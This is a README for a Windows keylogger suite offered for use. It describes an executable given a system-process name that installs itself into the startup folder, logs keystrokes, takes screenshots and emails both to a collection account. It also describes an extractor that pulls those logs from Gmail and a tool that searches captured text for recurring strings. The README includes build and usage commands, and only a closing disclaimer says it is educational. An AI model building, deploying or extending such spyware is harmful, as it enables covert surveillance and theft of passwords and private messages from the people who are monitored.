# AutolaunchingRemoteKeylogger
A suite of 3 programs:
1. A keylogger (`windowsProcess.py`) packaged into an `.exe` (`dist/windowsProcess.exe`). When opened, copies itself to Windows starting directory so it automatically launches each startup. Logs keys until user stops typing, then sends logged keys and a screenshot to a target email.
2. An extractor for emailed key-logs (`keylogExtractor.py`). Extracts the emailed logged keys and saves them into files based on source computer.
  - The fully concatenated file format is suitable for the 3rd program, which searches for common strings.
  - The timestamp-seperated file format is suitable for discerning seperate user sessions or spurts of usage.
3. A common-string searcher (`stringExtractor.py`), which outputs a file with complex formatting and keywords removed for easier manual analysis. Also allows user to input parameters for automatic common-string searching.
- First argument is the source file (which must be a fully concatenated file).
- Second argument is the minimum number of characters each subject string should have.
- Third argument is the number of search results to display.

# Usage

## Keylogger
Simply launch the `.exe` file.

To recompile the `.exe` file, run:
`pyinstaller --noconsole windowsProcess.py --onefile`

## Keylog Extractor
Change the `user` and `password` fields to the recipient account of the key-logs.
The account must be a google account.
You also need to:
- Enable IMAP in gmail settings.
- Use an app-password for the `password` field (this is different from your google account password). You will need to enable 2FA to do this.

No command-line argument is required as the data is sourced from gmail.

Example usage:
`python keylogExtractor.py`

Example Output:
Two folders produced:
Concat Extraction 25-10-2023 21 36 33
Timestamp-data Extraction 25-10-2023 21 36 33

Each folder will contain a file with the name of the target computer Id.

## String Extractor
Provide a fully-concatenated extracted file as the first argument. This should be a file from the Keylog Extractor, specifically of the fully-concatenated type.
The second argument is the minimum number of characters a subject string should have.
The third argument is the number of search results to display.

Example usage:
`python c:/[REDACTED]/stringExtractor.py 1234ABCD-12AB-12AB-12AB-123456ABCDEF.txt 6 20`



These programs are for educational purposes only. They must not be used with malicious intent. Only use these programs on devices you own.
